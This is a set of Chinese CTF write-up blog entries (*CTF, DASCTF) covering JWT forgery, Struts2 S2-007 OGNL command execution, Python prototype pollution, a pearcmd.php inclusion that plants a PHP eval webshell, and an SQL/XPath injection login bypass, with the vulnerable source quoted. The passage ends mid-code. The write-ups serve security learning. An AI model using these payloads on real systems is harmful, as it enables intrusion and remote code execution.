        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2><ol><li>F12，发现提示。</li></ol><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.1.png"></p><ol start="2"><li><p>进入<code>JWT_key.php</code>，得到源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>根据源码，可以知道<code>salt</code>长度为14，常规做法是把<code>salt</code>爆破出来。可以利用  <a href="https://blog.csdn.net/qq_45290991/article/details/120400363">hash长度拓展攻击</a> 来绕过验证，从而得到<code>secret_key</code>。</p></li><li><p>利用<code>hashpump</code>生成新的<code>MD5</code>和<code>password</code>。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.2.png"></p></li><li><p>把<code>\x</code>换成<code>%</code>，用bp发送过去，即可得到<code>secret_key</code>。、</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.3.png"></p></li><li><p>回到开始的页面，开始伪造<code>jwt</code>。拿到cookie，去 jwt.io 将user改成admin。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.4.png"></p></li><li><p>将<code>access_token</code>的值改成新伪造好的值，即可进入下面这个页面。</p><p>​<img src="/%E2%80%BBCTF/%E4%B8%80.1.5.png"></p></li><li><p>根据题目名称，前面是jwt了，那么后面是struts2，源码中也有提示。</p></li><li><p>经过测试，是<code>S2-007</code>， <a href="https://blog.csdn.net/q20010619/article/details/120729447">ctfshow web281-S2-007</a> 。</p><p>执行任意代码poc:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>传入后即可执行<code>id</code>并回显。</p><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.6.png"></p></li><li><p>执行命令<code>env</code>查看环境变量，即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E2%80%BBCTF/%E4%B8%80.1.7.png"></p></li></ol><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><ol><li><p>题目描述：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice在参加某个CTF比赛，她成功的解出了一道题，拿到了flag。她很开心，迫不及待地想要向Bob分享她的喜悦。于是按下了快捷键Shift+Win+S使用了Windows 11的截图工具，截取了整个屏幕，并且保存为文件1.png。然后，考虑到比赛规则中规定flag需要保密，她使用了截图工具中的“裁剪”功能，将flag裁剪掉了一部分，然后将裁剪结果覆盖了原文件1.png并保存。最终，她将1.png发给了Bob。Bob马上就知道了她的整个flag，你知道是如何做到的吗？</span><br></pre></td></tr></table></figure></li><li><p>题目附件：</p><p><img src="/%E2%80%BBCTF/1.png"></p></li><li><p>用必应搜索一下，发现有cve，得到cve编号为<code>CVE-2023-28303</code>。</p><p><img src="/%E2%80%BBCTF/misc.1.3.png"></p></li><li><p>在github上搜索是否有可用工具，搜索到了<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">这个工具</a>，后边是利用这个工具还原图片。</p><p><img src="/%E2%80%BBCTF/misc.1.1.png"></p><p><img src="/%E2%80%BBCTF/misc.1.2.png"></p></li></ol><h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><ol><li><p>附件：</p><p><img src="/%E2%80%BBCTF/task.png"></p></li><li><p>依照 <a href="https://ja.fonts2u.com/dovahkiin.%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88">这个网站</a> 上的内容，对应图片上的图案，即可得到flag为<code>gikrvzy</code></p><p><img src="/%E2%80%BBCTF/misc.2.1.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> *CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/DASCTF/"/>
      <url>/DASCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><ol><li><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>审计发现有这个函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>百度后得知这是python的原型链污染。</p></li><li><p>通过分析，我们的目的是通过<code>/register</code>路由污染<code>__file__</code>变量，从而实现在<code>/</code>路由下的文件任意读取。</p></li><li><p>参考链接：<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">https://www.cnblogs.com/Article-kelp/p/17068716.html</a></p></li><li><p>学习过程中发现，需要<code>__init__</code>来实现全局变量的污染，但测试发现<code>__init__</code>被过滤了。</p></li><li><p>通过Unicode编码<code>__init__</code>，实现了<code>__file__</code>的污染。</p><p>payload:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span><span class="string">&quot;/proc/1/environ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><ol><li><p>打开环境，信息收集得到这个cms是<code>熊海cms V1.0</code>。</p></li><li><p>百度这个cms的漏洞，得到几个漏洞，分别是sql注入，文件包含，文件上传，文件任意下载，后台认证绕过。</p></li><li><p>尝试sql注入，用sqlmap一把梭，没找到flag，尝试日志写马，发现不行。</p></li><li><p>尝试文件上传，发现不能上传任何文件。</p></li><li><p>尝试文件任意下载，访问&#x2F;admin，用<code>admin:123456</code>登录进后台，选择<code>内容管理--下载列表</code>，点那个🖊的图标，进入修改页面。</p><p><img src="/DASCTF/ez_cms1.png"></p></li><li><p>在修改页面的文件位置填上文件的路径，然后点击保存。</p><p><img src="/DASCTF/ez_cms2.png"></p></li><li><p>返回一开始的页面，点🖊旁边的 √ 进入下载页面，然后点击联通下载，即可任意下载文件。</p><p><img src="/DASCTF/ez_cms3.png"></p></li><li><p>发现这里只能下载文件，但不知道flag在哪个文件，只能放弃。</p></li><li><p>文件包含功能，用上面的文件任意下载index.php的源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单一入口模式</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误显示</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>分析得知，使用了<code>addslashes</code>做了过滤，因此无法使用伪协议，而且包含的时候拼接了<code>.php</code>，也没办法绕过。</p></li><li><p>使用<code>pearcmd.php</code>进行文件包含。（参考链接：<a href="https://blog.csdn.net/JCPS_Y/article/details/127541665%EF%BC%89">https://blog.csdn.net/JCPS_Y/article/details/127541665）</a></p></li><li><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure></li><li><p>尝试过程中发现一直没有成功，猜测php的路径不对。</p></li><li><p>想到题目环境是用<code>doctor</code>搭的，是不是它们的php路径不一样呢？于是去打开个<code>doctor</code>去尝试一下，发现果然不一样。</p><p><img src="/DASCTF/ez_cms4.png"></p></li><li><p>于是修改路径为<code>/usr/share/php/pearcmd</code>，再次尝试，发现成功了。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/ez_cms5.png"></p></li><li><p>最后用r包含<code>/tmp/hello,php</code>，即可实现rce。</p><p><img src="/DASCTF/ez_cms6.png"></p></li><li><p>最后<code>cat /flag_you_find_ya</code>，即可得到flag。</p><p><img src="/DASCTF/ez_cms7.png"></p></li></ol><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><ol><li><p>万能密码登录，发现登录成功，再次登录一次，可以在源码中看到提示。(payload:<code>username=admin&#39;or 1=1 #</code>)</p><p><img src="/DASCTF/My1.png"></p></li><li><p>下载得到index.php的源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ 